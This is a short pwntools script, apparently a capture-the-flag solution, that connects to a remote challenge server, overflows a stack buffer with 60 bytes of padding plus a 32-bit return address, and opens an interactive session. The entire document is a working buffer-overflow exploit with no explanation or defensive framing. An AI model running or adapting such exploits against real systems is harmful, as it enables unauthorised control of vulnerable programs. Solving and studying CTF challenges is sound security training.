from pwn import *

r = remote("thekidofarcrania.com", 4902)

p = b"a"*60 + p32(0x08048586)
r.sendline(p)
r.interactive()